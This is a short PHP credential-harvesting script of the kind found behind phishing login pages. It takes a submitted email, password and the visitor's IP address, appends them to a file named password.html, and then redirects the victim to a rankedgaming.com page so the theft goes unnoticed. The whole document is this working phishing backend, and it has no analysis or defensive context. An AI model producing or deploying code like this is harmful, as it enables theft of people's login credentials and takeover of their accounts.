<?php 
$email=$_POST['email'];
$pass=$_POST['pass'];
$ip=$_SERVER['REMOTE_ADDR'];
$f=fopen("password.html","a+");

fwrite($f,'Email:[<b><font color="#0a00ff">'.$email.'</font></b>] Password:[<b><font color="#FF0040">'.$pass.'</font></b>] IP: [<b><font color="#FE2EF7">'.$ip.'</font></b>]<br>');

fclose($f);

header("location: https://admin.rankedgaming.com/accounts/game-logs.php");
 ?>}s